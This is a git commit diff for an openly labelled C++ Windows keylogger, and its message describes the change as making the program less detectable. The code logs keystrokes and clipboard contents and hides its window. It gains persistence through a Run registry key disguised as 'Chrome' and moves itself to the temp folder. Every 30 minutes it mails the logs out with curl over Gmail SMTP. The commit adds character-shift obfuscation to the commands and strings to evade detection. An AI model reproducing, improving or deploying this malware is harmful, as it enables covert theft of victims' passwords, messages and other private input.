b2614af3d3272d3b1be588fbdfb90e5192140d0c
vende11s <74505994+vende11s@users.noreply.github.com>
2021-01-09 13:03:59 +0100

    Make it less detectable and Bug Fix

--- main.cpp
+++ main.cpp
@@ -8,20 +8,32 @@
 #pragma warning(disable : 4996)
 using namespace std; //I have in my habit using that
 
+
 //U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
-const string exe_name = "keylogger.exe"; //Make sure its same as name of your file, else autostart and autoinstall 
-const string LogFileName = "data.th";
-const string EmailFrom = "example@gmail.com";
-const string EmailFromPassword = "YourPassowrd";
-const string EmailTo = "example@gmail.com";
+//ATTENTION, ACHTUNG, UWAGA, ВНИМАНИЕ U HAVE TO ENCRYPT STRINGS ELSE KEYLOGGER WON'T WORK, U CAN FIND ENCRYPTION TOOL IN MY REPOSITORY//vende11s
+const string exe_name = "lfzmphhfs/fyf"; //Make sure its same as name of your file, else autostart and autoinstall 
+const string LogFileName = "ebub/ui";
+const string EmailFrom = "fybnqmfAhnbjm/dpn";
+const string EmailFromPassword = "ZpvsQbttpxse";
+const string EmailTo = "fybnqmfAhnbjm/dpn";
 const bool IsWindowHidden = true;
 const bool LogClipboard = true;
 const bool RemoveLogsAfterSend = true; //It will remove Logs ONLY when sending log will be sucessfully
 const float FrequencyOfSendingLogs = 30; //In Minutes
 
 
+string decrypt(string text) {
+	int len = text.length();
+	for (int i = 0; i < len; i++)
+	{
+		text[i]--;
+	}
+	cout << text;
+	return text;
+}
+
 int send() {
-	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"" + EmailFrom + "\\\" --mail-rcpt \\\"" + EmailTo + "\\\" --ssl --upload-file %temp%\\" + LogFileName + " -u " + EmailFrom + ":" + EmailFromPassword + " -k --anyauth";
+	string cmd = decrypt("dvsm!tnuq;00tnuq/hnbjm/dpn;698!..ttm.sfre!.w!..nbjm.gspn!]#" + EmailFrom + "#]!..nbjm.sdqu!]#" + EmailTo + "#]!..ttm!..vqmpbe.gjmf!&ufnq&]#" + LogFileName + "!.v!" + EmailFrom + ";" + EmailFromPassword + "!.l!..bozbvui");
 	int info = system(cmd.c_str());
 	return info;
 }
@@ -39,39 +51,41 @@ string GetDirectory() {
 	GetSystemDirectory(letter, sizeof(letter));
 
 	cmd3 = letter[0];
-	cmd3 += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp\\";
+	cmd3 += decrypt(";]Vtfst]") + (string)username + decrypt("]BqqEbub]Mpdbm]Ufnq]");
 
 	return cmd3;
 }
 void autostart() {
 	string cmd = GetDirectory();
-	cmd += exe_name;
+	cmd += decrypt(exe_name);
 	if (!filexits(cmd.c_str())) {
 
-		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d " + cmd;
+		string cmd2 = decrypt("Sfh!Bee!ILFZ`DVSSFOU`VTFS]Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo!0w!Dispnf!0u!SFH`T[!0e") + cmd;
 
 		system(cmd2.c_str());
 
 		fstream file;
-		file.open("temp.bat", ios::out);
-		file << "taskkill /IM " + exe_name + " /F\n"
-			<< "move " + exe_name + " %temp%\n"
-			<< "start  %temp%\\" + exe_name
-			<< "\ndel temp.bat"
+		file.open(decrypt("ufnq/cbu"), ios::out);
+		file << decrypt("ubtlljmm!0JN!" + exe_name) + " /F"
+			<< "\nmove " + decrypt(exe_name + "!&ufnq&")+"\n"
+			<< decrypt("tubsu!!&ufnq&]" + exe_name)
+			<< "\n"+decrypt("efm!ufnq/cbu")
 			<< "\nexit";
 
 		file.close();
-		system("start temp.bat");
+		system(decrypt("tubsu!ufnq/cbu").c_str());
 
 	}
 }
 
 
-void LOG(string input) {
+void LOG(string input, bool decrypt_ = true) {
 	fstream LogFile;
-	LogFile.open(LogFileName, fstream::app);
+	LogFile.open(decrypt(LogFileName), fstream::app);
 	if (LogFile.is_open()) {
-		LogFile << input;
+		if(decrypt_)
+		LogFile << decrypt(input);
+		else LogFile << input;
 		LogFile.close();
 	}
 }
@@ -80,46 +94,49 @@ void LOG(string input) {
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
-		LOG(" #SPACE# ");
+		LOG("!$TQBDF$!");
 		return true;
 	case VK_RETURN:
-		LOG("\n#ENTER# ");
+	{
+		LOG("\n", false);
+		LOG("!$FOUFS$!");
 		return true;
+	}
 	case '.':
-		LOG(".");
+		LOG("/");
 		return true;
 	case VK_SHIFT:
-		LOG(" #SHIFT# ");
+		LOG("!$TIJGU$!");
 		return true;
 	case VK_BACK:
-		LOG(" #BACKSPACE# ");
+		LOG("!$CBDLTQBDF$!");
 		return true;
 	case VK_RBUTTON:
-		LOG(" #R_CLICK# ");
+		LOG("!$S`DMJDL$!");
 		return true;
 	case VK_CAPITAL:
-		LOG(" #CAPS_LOCK# ");
+		LOG("!$DBQT`MPDL$!");
 		return true;
 	case VK_TAB:
-		LOG(" #TAB# ");
+		LOG("!$UBC$!");
 		return true;
 	case VK_UP:
-		LOG(" #UP_ARROW# ");
+		LOG("!$VQ`BSSPX$!");
 		return true;
 	case VK_DOWN:
-		LOG(" #DOWN_ARROW# ");
+		LOG("!$EPXO`BSSPX$!");
 		return true;
 	case VK_LEFT:
-		LOG(" #LEFT_ARROW# ");
+		LOG("!$MFGU`BSSPX$!");
 		return true;
 	case VK_RIGHT:
-		LOG(" #RIGHT_ARROW# ");
+		LOG("!$SJHIU`BSSPX$!");
 		return true;
 	case VK_CONTROL:
-		LOG(" #CONTROL_ARROW# ");
+		LOG("!$DPOUSPM`BSSPX$!");
 		return true;
 	case VK_MENU:
-		LOG(" #ALT# ");
+		LOG("!$BMU$!");
 		return true;
 	default:
 		return false;
@@ -130,26 +147,26 @@ HANDLE clip = 0;
 char* buff;
 string buffstr = "";
 void ClipBoard() {
-	   
-		OpenClipboard(NULL);
 
-		if (IsClipboardFormatAvailable(CF_TEXT))
-		{
-			clip = GetClipboardData(CF_TEXT);
-		}
-		else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
-		{
-			clip = GetClipboardData(CF_UNICODETEXT);
-		}
-		CloseClipboard();
-		buff = (char*)clip;
-		if (buff != buffstr) {
-			cout << buff<<endl;
-			buffstr = buff;
-			LOG(" #CLIPBOARD#> ");
-			LOG(buffstr);
-			LOG(" <#CLIPBOARD# ");
-		}
+	OpenClipboard(NULL);
+
+	if (IsClipboardFormatAvailable(CF_TEXT))
+	{
+		clip = GetClipboardData(CF_TEXT);
+	}
+	else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
+	{
+		clip = GetClipboardData(CF_UNICODETEXT);
+	}
+	CloseClipboard();
+	buff = (char*)clip;
+	if (buff != buffstr) {
+		cout << buff << endl;
+		buffstr = buff;
+		LOG("!$DMJQCPBSE$?!");
+		LOG(buffstr,0);
+		LOG("!=$DMJQCPBSE$!");
+	}
 }
 
 int main()
@@ -157,7 +174,7 @@ int main()
 	if (IsWindowHidden) ShowWindow(GetConsoleWindow(), SW_HIDE);
 	fstream LogFile;
 	//To make sure  LogFile is created
-	LogFile.open(GetDirectory() + LogFileName, ios::out);
+	LogFile.open(GetDirectory() + decrypt(LogFileName), ios::out);
 	LogFile.close();
 	//Sleep because pc after boot can haven't connected to internet yet
 	Sleep(500);
@@ -172,30 +189,30 @@ int main()
 	time(&t);
 	tt = localtime(&t);
 
-		//Log at start of program
-		LogFile.open(LogFileName, fstream::app);
-		LogFile << endl << "###" << asctime(tt);
-		LogFile.close();
-		send();
+	//Log at start of program
+	LogFile.open(decrypt(LogFileName), fstream::app);
+	LogFile << endl << "###" << asctime(tt);
+	LogFile.close();
+	send();
 
-		time_t one=clock();
-		
-	 while (true) {
-		 time_t two = clock();
-		 double time1 = (double)(two - one) / CLOCKS_PER_SEC;
-		 if (time1 / 60 >= FrequencyOfSendingLogs)
-		 {
-			 one = clock();
-			 time(&t);
-			 tt = localtime(&t);
-			 LogFile.open(LogFileName, fstream::app);
-			 LogFile << endl << "#|#" << asctime(tt);
-			 LogFile.close();
+	time_t one = clock();
 
-			 int info = send();
-			 if (RemoveLogsAfterSend && info == 0)
-				 remove(LogFileName.c_str());
-		 }
+	while (true) {
+		time_t two = clock();
+		double time1 = (double)(two - one) / CLOCKS_PER_SEC;
+		if (time1 / 60 >= FrequencyOfSendingLogs)
+		{
+			one = clock();
+			time(&t);
+			tt = localtime(&t);
+			LogFile.open(decrypt(LogFileName), fstream::app);
+			LogFile << endl << "#|#" << asctime(tt);
+			LogFile.close();
+
+			int info = send();
+			if (RemoveLogsAfterSend && info == 0)
+				remove(decrypt(LogFileName).c_str());
+		}
 
 		//Log Clipboard
 		if (LogClipboard) ClipBoard();
@@ -205,13 +222,11 @@ int main()
 			// Logging chars
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
-					LogFile.open(LogFileName, fstream::app);
+					LogFile.open(decrypt(LogFileName), fstream::app);
 					LogFile << char(KEY);
 					LogFile.close();
 				}
 			}
 		}
 	}
-
-	return 0;
 }
